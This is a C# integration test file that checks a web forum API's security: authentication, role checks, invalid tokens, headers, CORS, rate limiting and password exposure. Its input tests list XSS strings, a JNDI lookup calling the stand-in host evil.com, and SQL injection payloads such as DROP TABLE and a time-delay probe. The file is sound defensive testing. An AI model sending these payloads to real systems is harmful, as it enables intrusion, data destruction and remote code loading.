using FluentAssertions;
using System.Net;
using WebForum.IntegrationTests.Base;
using WebForum.IntegrationTests.Infrastructure;
using WebForum.IntegrationTests.Utilities;
using WebForum.Api.Models;
using WebForum.Api.Models.Request;

namespace WebForum.IntegrationTests.CrossCutting;

/// <summary>
/// Integration tests for security concerns across the API
/// Covers authentication, authorization, input sanitization, and security headers
/// </summary>
public class SecurityTests : IntegrationTestBase
{
  public SecurityTests(WebForumTestFactory factory) : base(factory)
  {
  }

  [Fact]
  public async Task UnauthorizedAccess_ToProtectedEndpoints_ShouldReturnUnauthorized()
  {
    // Arrange
    await InitializeTestAsync();
    var user = await CreateTestUserAsync();
    var post = await CreateTestPostAsync(user.Id);

    var protectedEndpoints = new[]
    {
            ("POST", "/api/posts", HttpUtilities.CreateJsonContent(new CreatePostRequest
                { Title = "Test", Content = "Test content here" })),
            ("POST", $"/api/posts/{post.Id}/like", null),
            ("POST", $"/api/posts/{post.Id}/comments", HttpUtilities.CreateJsonContent(new CreateCommentRequest
                { Content = "Test comment" })),
            ("POST", $"/api/posts/{post.Id}/tags", HttpUtilities.CreateJsonContent(new { name = "test" })),
            ("DELETE", $"/api/posts/{post.Id}/tags/test", null)
        };

    foreach (var (method, endpoint, content) in protectedEndpoints)
    {
      // Act
      HttpResponseMessage response = method switch
      {
        "POST" => await Client.PostAsync(endpoint, content),
        "DELETE" => await Client.DeleteAsync(endpoint),
        _ => throw new ArgumentException($"Unsupported method: {method}")
      };

      // Assert
      response.StatusCode.Should().Be(HttpStatusCode.Unauthorized,
          $"Endpoint {method} {endpoint} should require authentication");
    }
  }

  [Fact]
  public async Task RoleBasedAuthorization_ShouldEnforcePermissions()
  {
    // Arrange
    await InitializeTestAsync();
    var regularUser = await CreateTestUserAsync("regular", "regular@example.com", UserRoles.User);
    var moderator = await CreateTestUserAsync("moderator", "mod@example.com", UserRoles.Moderator);

    var regularUserClient = CreateAuthenticatedClient(regularUser.Id, regularUser.Username, UserRoles.User);
    var moderatorClient = CreateAuthenticatedClient(moderator.Id, moderator.Username, UserRoles.Moderator);

    var post = await CreateTestPostAsync(regularUser.Id, "Test Post", "Content for moderation testing");

    // Act & Assert - Regular user should NOT have moderator permissions
    var regularUserModerateResponse = await regularUserClient.PostAsync($"/api/posts/{post.Id}/moderate", null);
    regularUserModerateResponse.StatusCode.Should().BeOneOf(
        HttpStatusCode.Forbidden,
        HttpStatusCode.Unauthorized,
        HttpStatusCode.NotFound // If endpoint doesn't exist or returns 404 for unauthorized
    );

    // Act & Assert - Moderator SHOULD have moderator permissions
    var moderatorModerateResponse = await moderatorClient.PostAsync($"/api/posts/{post.Id}/moderate", null);
    moderatorModerateResponse.StatusCode.Should().BeOneOf(
        HttpStatusCode.OK,
        HttpStatusCode.NoContent,
        HttpStatusCode.NotFound // If moderation endpoint is not implemented yet
    );
  }

  [Fact]
  public async Task AuthenticationWithInvalidToken_ShouldReturnUnauthorized()
  {
    // Arrange
    await InitializeTestAsync();
    var user = await CreateTestUserAsync();

    var invalidTokens = new[]
    {
            "invalid.jwt.token",
            "Bearer invalid.jwt.token",
            "",
            "malformed-token-without-dots",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature", // JWT with invalid signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.EXPIRED" // Fake expired token
        };

    foreach (var invalidToken in invalidTokens)
    {
      // Arrange
      var clientWithInvalidToken = Factory.CreateClient();
      if (!string.IsNullOrEmpty(invalidToken))
      {
        clientWithInvalidToken.DefaultRequestHeaders.Authorization =
            new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", invalidToken);
      }

      var createPostRequest = new CreatePostRequest
      {
        Title = "Unauthorized Post",
        Content = "This should not be created with invalid token."
      };

      // Act
      var response = await HttpUtilities.PostAsync(clientWithInvalidToken, "/api/posts", createPostRequest);

      // Assert
      response.StatusCode.Should().Be(HttpStatusCode.Unauthorized,
          $"Invalid token '{(string.IsNullOrEmpty(invalidToken) ? "null/empty" : invalidToken.Substring(0, Math.Min(20, invalidToken.Length)))}...' should return Unauthorized");
    }
  }

  [Fact]
  public async Task InputSanitization_ShouldPreventXSSAndInjection()
  {
    // Arrange
    await InitializeTestAsync();
    var user = await CreateTestUserAsync();
    var authenticatedClient = CreateAuthenticatedClient(user.Id, user.Username);

    var maliciousInputs = new[]
    {
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<?php echo 'php injection'; ?>",
            "'; DROP TABLE Posts; --",
            "<img src=x onerror=alert('xss')>",
            "{{7*7}}", // Template injection
            "${jndi:ldap://evil.com/x}", // JNDI injection
            "<iframe src='javascript:alert(1)'></iframe>"
        };

    foreach (var maliciousInput in maliciousInputs)
    {
      // Act - Try to create post with malicious content
      var postRequest = new CreatePostRequest
      {
        Title = $"Test Post with {maliciousInput.Substring(0, Math.Min(10, maliciousInput.Length))}",
        Content = $"Content containing malicious input: {maliciousInput}"
      };

      var postResponse = await HttpUtilities.PostAsync(authenticatedClient, "/api/posts", postRequest);

      if (postResponse.StatusCode == HttpStatusCode.Created)
      {
        var createdPost = await HttpUtilities.ReadAsAsync<WebForum.Api.Models.Response.PostResponse>(postResponse);

        // Assert - Malicious content should be sanitized or escaped
        createdPost.Title.Should().NotContain("<script>");
        createdPost.Title.Should().NotContain("javascript:");
        createdPost.Content.Should().NotContain("<script>");
        createdPost.Content.Should().NotContain("javascript:");

        // Verify the post can be safely retrieved
        var getResponse = await Client.GetAsync($"/api/posts/{createdPost.Id}");
        getResponse.StatusCode.Should().Be(HttpStatusCode.OK);

        var retrievedPost = await HttpUtilities.ReadAsAsync<WebForum.Api.Models.Response.PostResponse>(getResponse);
        retrievedPost.Title.Should().NotContain("<script>");
        retrievedPost.Content.Should().NotContain("<script>");
      }
      else
      {
        // If the request was rejected, that's also acceptable security behavior
        postResponse.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity
        );
      }
    }
  }

  [Fact]
  public async Task SecurityHeaders_ShouldBePresent()
  {
    // Arrange
    await InitializeTestAsync();

    // Act
    var response = await Client.GetAsync("/api/posts");

    // Assert
    response.StatusCode.Should().Be(HttpStatusCode.OK);

    // Check for important security headers
    var headers = response.Headers.ToDictionary(h => h.Key.ToLower(), h => string.Join(", ", h.Value));
    var contentHeaders = response.Content.Headers.ToDictionary(h => h.Key.ToLower(), h => string.Join(", ", h.Value));
    var allHeaders = headers.Concat(contentHeaders).ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

    // These are common security headers that should be present
    // Note: Some may be configured at the web server level rather than application level
    var recommendedHeaders = new[]
    {
            "x-content-type-options",   // Should be "nosniff"
            "x-frame-options",          // Should be "DENY" or "SAMEORIGIN"
            "x-xss-protection",         // Should be "1; mode=block"
            "cache-control",            // Should be appropriate for the content
            "content-type"              // Should be "application/json" for API responses
        };

    foreach (var headerName in recommendedHeaders)
    {
      if (allHeaders.ContainsKey(headerName))
      {
        allHeaders[headerName].Should().NotBeNullOrEmpty($"Security header {headerName} should have a value");
      }
      // Note: Not asserting presence since these might be configured at different levels
    }

    // Content-Type should definitely be present for API responses
    if (allHeaders.ContainsKey("content-type"))
    {
      allHeaders["content-type"].Should().Contain("application/json");
    }
  }

  [Fact]
  public async Task CORS_ShouldAllowConfiguredOrigins()
  {
    // Arrange
    await InitializeTestAsync();

    // Act - Simulate a CORS preflight request
    var request = new HttpRequestMessage(HttpMethod.Options, "/api/posts");
    request.Headers.Add("Origin", "https://localhost:3000");
    request.Headers.Add("Access-Control-Request-Method", "POST");
    request.Headers.Add("Access-Control-Request-Headers", "Content-Type, Authorization");

    var response = await Client.SendAsync(request);

    // Assert
    // CORS preflight should return 200 OK or 204 No Content
    response.StatusCode.Should().BeOneOf(HttpStatusCode.OK, HttpStatusCode.NoContent);

    // Check CORS headers (if CORS is configured)
    var headers = response.Headers.ToDictionary(h => h.Key.ToLower(), h => string.Join(", ", h.Value));

    // If CORS is enabled, these headers should be present
    if (headers.ContainsKey("access-control-allow-origin"))
    {
      headers["access-control-allow-origin"].Should().NotBeNullOrEmpty();

      if (headers.ContainsKey("access-control-allow-methods"))
      {
        headers["access-control-allow-methods"].Should().Contain("POST");
      }

      if (headers.ContainsKey("access-control-allow-headers"))
      {
        var allowedHeaders = headers["access-control-allow-headers"].ToLower();
        allowedHeaders.Should().Contain("authorization");
        allowedHeaders.Should().Contain("content-type");
      }
    }
  }

  [Fact]
  public async Task PasswordSecurity_ShouldNotExposePasswords()
  {
    // Arrange
    await InitializeTestAsync();

    var registrationRequest = new RegistrationRequest
    {
      Username = "securityuser",
      Email = "security@example.com",
      Password = "SuperSecretPassword123!",
      Role = UserRoles.User
    };

    // Act - Register user
    var registerResponse = await HttpUtilities.PostAsync(Client, "/api/auth/register", registrationRequest);
    registerResponse.StatusCode.Should().Be(HttpStatusCode.Created);

    var authResponse = await HttpUtilities.ReadAsAsync<WebForum.Api.Models.Response.AuthResponse>(registerResponse);

    // Act - Get user profile
    var userResponse = await Client.GetAsync($"/api/users/{authResponse.User.Id}");
    userResponse.StatusCode.Should().Be(HttpStatusCode.OK);

    var userProfile = await HttpUtilities.ReadAsAsync<WebForum.Api.Models.Response.UserResponse>(userResponse);

    // Assert - Password should never be exposed in any API response
    var responseContent = await userResponse.Content.ReadAsStringAsync();
    responseContent.Should().NotContain("password", "Password should not be exposed in user profile");
    responseContent.Should().NotContain("SuperSecretPassword123!", "Actual password should not be exposed");

    // User profile should not have password field
    userProfile.Should().NotBeNull();
    userProfile.Username.Should().Be(registrationRequest.Username);
    // Verify there's no password property exposed (this is enforced by the response model)
  }

  [Fact]
  public async Task RateLimiting_ShouldPreventAbuse()
  {
    // Arrange
    await InitializeTestAsync();
    var user = await CreateTestUserAsync();
    var authenticatedClient = CreateAuthenticatedClient(user.Id, user.Username);

    // Act - Make many rapid requests
    var rapidRequests = Enumerable.Range(1, 50).Select(async i =>
    {
      var request = new CreatePostRequest
      {
        Title = $"Rapid Post {i}",
        Content = $"This is rapid post number {i} for rate limiting test."
      };
      return await HttpUtilities.PostAsync(authenticatedClient, "/api/posts", request);
    });

    var responses = await Task.WhenAll(rapidRequests);

    // Assert - Some requests might be rate limited
    var successfulRequests = responses.Count(r => r.StatusCode == HttpStatusCode.Created);
    var rateLimitedRequests = responses.Count(r => r.StatusCode == HttpStatusCode.TooManyRequests);

    // If rate limiting is implemented, we should see some 429 responses
    // If not implemented, all should succeed (which is also valid for this test)
    (successfulRequests + rateLimitedRequests).Should().Be(50);

    if (rateLimitedRequests > 0)
    {
      // If rate limiting is active, check for proper headers
      var rateLimitedResponse = responses.First(r => r.StatusCode == HttpStatusCode.TooManyRequests);
      var headers = rateLimitedResponse.Headers.ToDictionary(h => h.Key.ToLower(), h => string.Join(", ", h.Value));

      // Common rate limiting headers
      if (headers.ContainsKey("retry-after"))
      {
        headers["retry-after"].Should().NotBeNullOrEmpty();
      }
    }
  }

  [Fact]
  public async Task SQLInjection_ShouldNotAffectDatabase()
  {
    // Arrange
    await InitializeTestAsync();
    var user = await CreateTestUserAsync();

    // SQL injection payloads
    var sqlInjectionPayloads = new[]
    {
            "'; DROP TABLE Users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM Users --",
            "'; INSERT INTO Users (Username, Email) VALUES ('hacker', 'hack@evil.com'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'a'='a",
            "1'; WAITFOR DELAY '00:00:05'; --"
        };

    foreach (var payload in sqlInjectionPayloads)
    {
      // Act - Try SQL injection through search/filter parameters
      var searchResponse = await Client.GetAsync($"/api/posts?authorId={Uri.EscapeDataString(payload)}");
      var userSearchResponse = await Client.GetAsync($"/api/users/{Uri.EscapeDataString(payload)}");

      // Assert - Should handle malicious input gracefully
      searchResponse.StatusCode.Should().BeOneOf(
          HttpStatusCode.BadRequest,
          HttpStatusCode.NotFound,
          HttpStatusCode.OK // If input is sanitized and treated as invalid ID
      );

      userSearchResponse.StatusCode.Should().BeOneOf(
          HttpStatusCode.BadRequest,
          HttpStatusCode.NotFound,
          HttpStatusCode.OK
      );

      // Verify database is still intact by creating a legitimate post
      var authenticatedClient = CreateAuthenticatedClient(user.Id, user.Username);
      var testPost = new CreatePostRequest
      {
        Title = "Integrity Test Post",
        Content = "This post verifies database integrity after SQL injection attempt."
      };

      var createResponse = await HttpUtilities.PostAsync(authenticatedClient, "/api/posts", testPost);
      createResponse.StatusCode.Should().Be(HttpStatusCode.Created,
          "Database should remain functional after SQL injection attempt");
    }
  }

  [Fact]
  public async Task SessionSecurity_ShouldHandleTokenProperly()
  {
    // Arrange
    await InitializeTestAsync();
    var user = await CreateTestUserAsync();
    var authenticatedClient = CreateAuthenticatedClient(user.Id, user.Username);

    // Act - Make authenticated request
    var response = await authenticatedClient.GetAsync($"/api/users/{user.Id}");

    // Assert
    response.StatusCode.Should().Be(HttpStatusCode.OK);

    // Verify no sensitive token information is leaked in response
    var responseContent = await response.Content.ReadAsStringAsync();
    responseContent.Should().NotContain("Bearer ");
    responseContent.Should().NotContain("jwt");
    responseContent.Should().NotContain("token");

    // Response headers should not expose sensitive information
    var headers = response.Headers.ToDictionary(h => h.Key.ToLower(), h => string.Join(", ", h.Value));
    headers.Keys.Should().NotContain("authorization");
    headers.Keys.Should().NotContain("x-auth-token");
  }
}
